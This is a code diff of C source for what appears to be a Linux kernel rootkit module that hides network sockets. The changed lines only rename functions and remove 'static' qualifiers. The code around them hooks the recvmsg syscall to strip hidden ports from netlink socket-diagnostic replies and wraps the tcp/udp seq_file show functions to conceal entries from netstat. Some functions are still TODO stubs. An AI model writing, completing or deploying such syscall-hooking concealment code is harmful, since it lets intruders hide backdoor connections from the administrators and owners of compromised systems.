@@ -52,7 +52,7 @@ static int udp4_ports[PORTS_BUFFSIZE];   //TODO: to be deleted
 static int udp4_ports_count;   //TODO: to be deleted
 static int udp6_ports[PORTS_BUFFSIZE];   //TODO: to be deleted
 static int udp6_ports_count;   //TODO: to be deleted
-asmlinkage ssize_t (*recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);   //TODO: should point to original_recvmsg
+asmlinkage ssize_t (*sm_original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);   //TODO: should point to original_recvmsg
 asmlinkage int (*original_tcp4_show) (struct seq_file *, void *);
 asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
 asmlinkage int (*original_udp4_show) (struct seq_file *, void *);
@@ -60,13 +60,13 @@ asmlinkage int (*original_udp6_show) (struct seq_file *, void *);
 
 
 /* Declaration of functions */
-static int socket_masking_init(int);
-static int socket_masking_exit(void);
+int socket_masking_init(int);
+int socket_masking_exit(void);
 
-asmlinkage ssize_t my_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
+asmlinkage ssize_t socket_masking_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
 
-static int mask_socket(char *protocol, int port);
-static int unmask_socket(char *protocol, int port);
+int mask_socket(char *protocol, int port);
+int unmask_socket(char *protocol, int port);
 
 static void netstat_masking_init(void);
 static void netstat_masking_exit(void);
@@ -132,7 +132,7 @@ struct proc_dir_entry {
 
 
 /* Initialization function */
-static int socket_masking_init(int debug_mode_on)
+int socket_masking_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
@@ -144,7 +144,7 @@ static int socket_masking_init(int debug_mode_on)
 }
 
 
-static int socket_masking_exit(void)
+int socket_masking_exit(void)
 {
 	netstat_masking_exit();
 
@@ -160,7 +160,7 @@ static int socket_masking_exit(void)
    iterate through the inet diag msg structs (each prepended by a nlmsghdr) and compare the
    source and destination ports with our list of hidden ones. In order to hide an entry we copy
    the remaining entries over it and adjust the data length which is returned to the user. */
-asmlinkage ssize_t my_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
+asmlinkage ssize_t socket_masking_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
 {
 	long ret;
 	struct nlmsghdr *nlh;
@@ -171,7 +171,7 @@ asmlinkage ssize_t my_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg
 	int i;
 
 	/* Call original `recvmsg` syscall */
-	ret = recvmsg_syscall(sockfd, msg, flags);
+	ret = sm_original_recvmsg_syscall(sockfd, msg, flags);
 
 	/* Some error occured. Don't do anything. */
 	if (ret < 0)
@@ -225,7 +225,7 @@ asmlinkage ssize_t my_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg
 }
 
 
-static int mask_socket(char *protocol, int port)
+int mask_socket(char *protocol, int port)
 {
 	if (is_invalid_protocol(protocol) || is_invalid_port(port))
 		return 1;
@@ -236,7 +236,7 @@ static int mask_socket(char *protocol, int port)
 }
 
 
-static int unmask_socket(char *protocol, int port)
+int unmask_socket(char *protocol, int port)
 {
 	//TODO: to be implemented
 
